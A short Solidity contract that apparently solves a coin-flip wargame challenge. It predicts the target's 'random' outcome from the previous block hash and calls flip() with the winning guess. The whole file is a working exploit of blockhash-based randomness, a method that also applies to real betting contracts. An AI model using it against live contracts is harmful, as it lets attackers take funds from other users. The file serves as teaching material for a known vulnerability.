// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.1.0/contracts/math/SafeMath.sol"; 

contract CoinFlipCaller {

    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function winCoinFlip(address coinFlipAddress) public {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        (bool success,) = coinFlipAddress.call{gas: 5000000}(abi.encodeWithSignature("flip(bool)", side));
        require(success, "Not sucessful...");
    }
}